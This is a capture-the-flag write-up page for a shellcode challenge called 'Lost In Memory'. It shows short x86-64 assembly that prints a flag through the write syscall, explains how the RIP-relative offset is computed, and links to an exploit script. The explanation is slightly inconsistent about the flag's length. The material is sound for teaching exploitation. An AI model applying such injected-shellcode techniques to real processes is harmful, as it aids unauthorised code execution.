<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>lost_in_memory - Cyberchallenge Writeups</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <link href="../../css/custom-styles.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Lost In Memory", url: "#_top", children: [
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../server/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../server/" class="btn btn-xs btn-link">
        server
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../multistage/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../multistage/" class="btn btn-xs btn-link">
        multistage
      </a>
    </div>
    
  </div>

    

    <h1 id="lost-in-memory">Lost In Memory</h1>
<pre><code class="language-c">lea rax, [rip]
sub rax, 0x6e
mov rdi, 1
mov rsi, rax
mov rdx, 47
mov rax, 1
syscall
</code></pre>
<ul>
<li>RAX: 1 (SYS_WRITE)</li>
<li>RDI: 1 (fd = STDOUT)</li>
<li>RSI: address of the flag</li>
<li>RDX: 47 (length of the flag in bytes)</li>
</ul>
<p>The idea is to use the address of the shellcode as the address of the string to print. The RIP contains the next instruction address. The flag is placed before the shellcode, so the address of the shellcode is the address of the flag minus 0x6e. Where 0x6e is the length of the flag.</p>
<p>The flag is 48 (0x30) bytes long. The stub is 55 (0x37) bytes long. The first instruction of the shellcode is 7 bytes long. Then 0x30 + 0x37 + 0x7 = 0x6e, that we have to subtract from the RIP.
We are using the first instruction of the shellcode because the RIP points to the next instruction.</p>
<p>The complete exploit is in <a href="script.py">script.py</a>.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../server/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../server/" class="btn btn-xs btn-link">
        server
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../multistage/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../multistage/" class="btn btn-xs btn-link">
        multistage
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/gio-del/ODC-Challenges-CTF/edit/main/shellcode/lost_in_memory/README.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gio-del/ODC-Challenges-CTF">Windmill Dark</a> theme by None (noraj).</p>
</footer>

</body>
</html>